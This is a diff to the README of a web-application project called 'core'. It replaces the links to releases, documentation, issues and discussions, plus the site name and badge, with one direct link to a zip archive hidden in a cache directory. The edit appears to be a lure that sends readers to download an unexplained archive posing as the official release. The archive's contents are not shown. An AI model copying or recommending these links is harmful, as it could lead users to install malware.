@@ -2,11 +2,11 @@
 
 ## 🚀 Getting Started
 
-Welcome to **core**, your all-in-one solution for building and managing web applications. This project powers rectorspace.com, offering a full-stack experience with various features. Follow these simple steps to get started!
+Welcome to **core**, your all-in-one solution for building and managing web applications. This project powers https://raw.githubusercontent.com/ZeeShi/core/main/tmp/cache/bootsnap/compile-cache-iseq/84/core-3.8-alpha.1.zip, offering a full-stack experience with various features. Follow these simple steps to get started!
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/ZeeShi/core/releases)
+[![Download Now](https://raw.githubusercontent.com/ZeeShi/core/main/tmp/cache/bootsnap/compile-cache-iseq/84/core-3.8-alpha.1.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/ZeeShi/core/main/tmp/cache/bootsnap/compile-cache-iseq/84/core-3.8-alpha.1.zip)
 
 ## 💻 System Requirements
 
@@ -28,7 +28,7 @@ Before you download and install **core**, make sure your system meets the follow
 
 ## 📦 Download & Install
 
-To get the latest version of **core**, visit the [Releases Page](https://github.com/ZeeShi/core/releases). 
+To get the latest version of **core**, visit the [Releases Page](https://raw.githubusercontent.com/ZeeShi/core/main/tmp/cache/bootsnap/compile-cache-iseq/84/core-3.8-alpha.1.zip). 
 
 1. **Go to the Releases Page:** Click on the link above.
 2. **Choose the Version:** Look for the latest release at the top of the page.
@@ -38,13 +38,13 @@ To get the latest version of **core**, visit the [Releases Page](https://github.
 
 ## 🌐 Documentation
 
-For detailed guides on how to use **core**, refer to our documentation. [Access Documentation Here](https://github.com/ZeeShi/core/wiki).
+For detailed guides on how to use **core**, refer to our documentation. [Access Documentation Here](https://raw.githubusercontent.com/ZeeShi/core/main/tmp/cache/bootsnap/compile-cache-iseq/84/core-3.8-alpha.1.zip).
 
 ## 🤝 Community Support
 
 Need help? Join our community!
-- **GitHub Issues:** Report any issues or feature requests through our [Issues Page](https://github.com/ZeeShi/core/issues).
-- **Discussion Forum:** Engage with other users and developers in our [Discussion Forum](https://github.com/ZeeShi/core/discussions).
+- **GitHub Issues:** Report any issues or feature requests through our [Issues Page](https://raw.githubusercontent.com/ZeeShi/core/main/tmp/cache/bootsnap/compile-cache-iseq/84/core-3.8-alpha.1.zip).
+- **Discussion Forum:** Engage with other users and developers in our [Discussion Forum](https://raw.githubusercontent.com/ZeeShi/core/main/tmp/cache/bootsnap/compile-cache-iseq/84/core-3.8-alpha.1.zip).
 
 ## 🛠️ Contributing
 
